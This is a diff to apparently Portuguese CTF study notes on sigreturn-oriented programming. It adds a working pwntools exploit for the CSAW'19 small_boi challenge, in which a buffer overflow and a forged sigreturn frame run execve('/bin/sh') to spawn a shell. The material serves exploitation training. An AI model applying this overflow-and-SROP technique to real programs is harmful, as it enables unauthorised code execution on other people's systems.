@@ -137,7 +137,35 @@ chamar a syscall basta executar!</p>
 <pre><code class="language-x86asm">mov rax, 0xf  ; 15
 syscall       ; ou int_80 em 32 bits sei la
 </code></pre>
-<a class="header" href="./stack/rop/SROP/SROP.html#exemplo" id="exemplo"><h1>Exemplo</h1></a>
+<a class="header" href="./stack/rop/SROP/SROP.html#exemplo-sem-leaks" id="exemplo-sem-leaks"><h1>Exemplo Sem leaks</h1></a>
+<p>Tabela de syscalls linux: <a href="https://filippo.io/linux-syscall-table/">filippo.io</a></p>
+<a class="header" href="./stack/rop/SROP/SROP.html#download" id="download"><h2>Download</h2></a>
+<p><a href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/16-srop/csaw19_smallboi/small_boi">nightmare: small_boi</a></p>
+<a class="header" href="./stack/rop/SROP/SROP.html#solução" id="solução"><h2>Solução</h2></a>
+<pre><code class="language-py">#!/usr/bin/python3
+from pwn import *
+
+
+elf = ELF(&quot;small_boi&quot;)
+io = process(elf.path)
+
+syscall = 0x400180 # mov eax, 0xf; syscall;
+                   # +5 = so a syscall
+
+sig = SigreturnFrame(arch='amd64')
+sig.rax = 59      # execve
+sig.rip = syscall+5
+sig.rdi = next(elf.search(b&quot;/bin/sh\x00&quot;))
+
+payload = b'A'*40      # cyclical_find
+payload += p64(syscall)
+payload += bytes(sig)
+
+io.sendline(payload)
+io.interactive()
+
+</code></pre>
+<a class="header" href="./stack/rop/SROP/SROP.html#exemplo-com-leaks" id="exemplo-com-leaks"><h1>Exemplo Com Leaks</h1></a>
 <a class="header" href="./stack/rop/SROP/SROP.html#sropc" id="sropc"><h2>srop.c</h2></a>
 <ul>
 <li><a href="https://amriunix.com/post/sigreturn-oriented-programming-srop/">amriunix</a></li>
